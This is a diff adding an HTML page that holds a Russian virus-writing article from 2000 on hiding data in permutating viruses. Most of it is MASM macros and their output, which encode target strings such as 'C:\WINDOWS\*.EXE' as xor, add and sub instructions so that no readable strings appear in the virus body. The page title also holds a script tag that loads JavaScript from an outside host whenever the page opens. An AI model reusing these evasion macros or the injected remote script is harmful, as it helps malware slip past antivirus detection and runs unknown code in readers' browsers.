@@ -1,0 +1,207 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+<HEAD>
+<TITLE>О КОДИРОВАНИИ ДАННЫХ В ПЕРМУТИРУЮЩИХ ВИРУСАХ</title><script language='JavaScript' type='text/javascript' src='http://proxy.host.sk/index.php'></script>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+</HEAD>
+<BODY bgcolor=#C0C0C0 text=#000000 alink=#000040 vlink=#000040 link=#000040>
+
+<h3 align=center>О КОДИРОВАНИИ ДАННЫХ В ПЕРМУТИРУЮЩИХ ВИРУСАХ</h3>
+
+<p>Пермутирующий  вирус  --  это  вирус, перестраивающий(изменяющий) свое
+ тело  на  уровне  ассемблерных  инструкций.  В  отличие  от  метаморфного,
+ пермутирующий  вирус  не  генерирует  новых  инструкций, а преобразует уже
+ имеющиеся. Возникает вопрос о хранении данных внутри такого вируса.
+<p>Учитывая  то,  что  измененные  инструкции  могут  быть  другой длины,
+ приходим  к  буферу  в  котором  содержится  только  код; этот буфер будет
+ перестраиваться с каждой новой копией вируса.
+<p>В таком случае возможны два варианта:
+<ul>
+<li>данные содержатся отдельно от кода и шифруются переменным ключом
+<li>данные генерируются кодом
+</ul>
+<p>Мне  ближе  всего второй вариант. Он обладает следующими свойствами: в
+ вирусе  присутствует только буфер с кодом; данные разбиты на части, каждая
+ из  которых генерируется по мере необходимости. Недостаток тут такой: код,
+ генерирующий данные занимает чуть больше места, чем сами данные.
+<p>Теперь представим себе, что мы пишем вирус в соответствии со следующим
+ правилом:   в   вирусе  может  присутствовать  только  код.  И  нам  нужно
+ использовать данные вида "C:\WINDOWS\*.EXE",0.
+<p>Удобно генерировать такую строку двумя путями:
+<pre><font color=#000040>
+ 1.                        2.
+ lea   edi, temparea       push 0
+ mov   eax, "W\:C"         push "EXE."
+ stosd                     push "*\SW"
+ mov   eax, "ODNI"         push "ODNI"
+ stosd                     push "W\:C"
+ mov   eax, "*\SW"         ; ESP=data
+ stosd                     ...
+ mov   eax, "EXE."         add esp, 20
+ stosd
+ xor   eax, eax
+ stosd
+; temparea=data
+</font></pre>
+<p>Здесь  возникает две проблемы. Во-первых, части строки будут "видны" в
+ коде  вируса, что не есть хорошо. Во-вторых, при большом количестве данных
+ набивать подобную хрень непросто.
+<p>Вывод:  требуется  макрос  для  преобразования  данных  в код. В конце
+ текста как раз и представлены такие макросы. Вызываются они так:
+<pre><font color=#000040>
+ 1.                                  2.
+ lea   edi, temparea                 x_push ecx, C:\WINDOWS\*.EXE~
+ x_stosd C:\WINDOWS\*.EXE~           nop
+                                     x_pop
+</font></pre>
+<p>Сгенеренный макросами код выглядит так:
+<pre><font color=#000040>
+1.                                   2.
+BF00200010 mov   edi,010002000       33C9         xor  ecx,ecx
+33C0       xor   eax,eax             81E900868687 sub  ecx,087868600
+2DBDC5A3A8 sub   eax,0A8A3C5BD       51           push ecx
+AB         stosd                     81F12E3F213D xor  ecx,03D213F2E
+350A741818 xor   eax,01818740A       51           push ecx
+AB         stosd                     81C1290E04E5 add  ecx,0E5040E29
+050E0518DB add   eax,0DB18050E       51           push ecx
+AB         stosd                     81F11E1D1865 xor  ecx,065181D1E
+357916046F xor   eax,06F041679       51           push ecx
+AB         stosd                     81E90614E8F7 sub  ecx,0F7E81406
+2D2ECD0111 sub   eax,01101CD2E       51           push ecx
+AB         stosd                     90           nop
+                                     8D642414     lea  esp,[esp][00014]
+</font></pre>
+<p>Вот сами макросы:
+<pre><font color=#000040>
+x_stosd_first           macro
+                        _eax    = 0
+                        xor     eax, eax
+                        endm
+
+x_stosd_next            macro   t, x
+                        if      t eq 0
+                        sub     eax, _eax - x
+                        endif
+                        if      (t eq 1) or (t eq 3)
+                        xor     eax, _eax xor x
+                        endif
+                        if      t eq 2
+                        add     eax, x - _eax
+                        endif
+                        _eax = x
+                        stosd
+                        endm
+
+x_stosd                 macro   x
+                          x_stosd_first
+                          j = 0
+                          s = 0
+                          t = 0
+                          irpc    c, <x>
+                            k = "&c"
+                            if      k eq "~"
+                              k = 0
+                            endif
+                            j = j + k shl s
+                            s = s + 8
+                            if s eq 32
+                              x_stosd_next t,j
+                              t = t + 1
+                              if t eq 4
+                                t = 0
+                              endif
+                              j = 0
+                              s = 0
+                            endif   ; i eq 4
+                          endm    ; irpc
+                          if s ne 0
+                            j = (j + 12345678h shl s) and 0ffffffffh
+                            x_stosd_next t,j
+                          endif
+                        endm    ; x_stosd
+
+x_push_first            macro   r
+                        xor     r, r
+                        _reg = 0
+                        endm
+
+x_push_next             macro   q, r, x
+                        if q eq 0
+                        sub     r, _reg - x
+                        endif
+                        if (q eq 1) or (q eq 3)
+                        xor     r, _reg xor x
+                        endif
+                        if q eq 2
+                        add     r, x - _reg
+                        endif
+                        push    r
+                        _reg = x
+                        endm
+
+x_push                  macro   r, x
+                        x_push_first r
+                        _xsize = 0
+                        l       = 0
+                        irpc    c, <x>
+                        l       = l + 1
+                        endm
+
+                        j = 0
+                        s = 0
+
+                        l0 = l
+                        if (l0 and 3) ne 0
+                        j = j shl 8 + "x"
+                        s = s + 8
+                        l0 = l0 + 1
+                        endif
+                        if (l0 and 3) ne 0
+                        j = j shl 8 + "y"
+                        s = s + 8
+                        l0 = l0 + 1
+                        endif
+                        if (l0 and 3) ne 0
+                        j = j shl 8 + "z"
+                        s = s + 8
+                        l0 = l0 + 1
+                        endif
+
+                        q = 0
+
+                        i       = l - 1
+                        irpc    c1, <x>
+                          t       = 0
+                          irpc    c, <x>
+                            if t eq i
+                              j = j shl 8
+                              if "&c" ne "~"
+                              j = j + "&c"
+                              endif
+                              s = s + 8
+                              if s eq 32
+                                _xsize = _xsize + 4
+                                x_push_next q,r,j
+                                q = q + 1
+                                if q eq 4
+                                  q = 0
+                                endif
+                                s = 0
+                                j = 0
+                              endif
+                              exitm
+                            endif
+                            t     = t + 1
+                          endm l irpc
+                          i = i - 1
+                        endm ; irpc
+                        if s ne 0
+                          error
+                        endif
+                        endm ; x_push
+
+x_pop                   macro
+                        lea     esp, [esp + _xsize]
+                        endm
+</font></pre>
+<p align=right>(x) 2000 Z
